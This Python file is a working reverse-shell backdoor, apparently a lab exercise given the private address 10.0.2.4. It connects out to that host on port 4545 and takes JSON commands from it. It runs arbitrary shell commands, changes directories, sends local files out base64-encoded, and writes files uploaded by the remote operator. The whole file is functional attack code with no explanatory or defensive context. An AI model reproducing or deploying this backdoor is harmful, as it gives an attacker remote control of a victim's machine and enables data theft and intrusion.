import socket
import subprocess
import simplejson
import os
import base64

class Connection():
	def __init__(self,ip,port):
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))

	def json_send(self,data):
		json_data = simplejson.dumps(data).encode("utf-8")
		self.my_connection.send(json_data)
		
	def json_recv(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)
			except ValueError:
				continue

	def command_ex(self,command):
		return subprocess.check_output(command, shell=True)
	
	def cd_execute(self,directory):
		os.chdir(directory)
		return "cd to" + directory

	def file_read(self,path):
		with open(path,"rb") as my_file:
			return base64.b64encode(my_file.read())
	
	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "upload OK"
	
	def Command(self):
		while True:
			command = self.json_recv()
			try:
				if command[0] == "exit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					output = self.cd_execute(command[1])
				elif command[0] == "download":
					output = self.file_read(command[1])
				elif command[0] == "upload":
					output = self.save_file(command[1],command[2])
				else: 
					output = self.command_ex(command)
			except Exception:
				output = "Eroor !"
			self.json_send(output)
		self.my_connection.close()
	
my_connect = Connection("10.0.2.4",4545)
my_connect.Command()

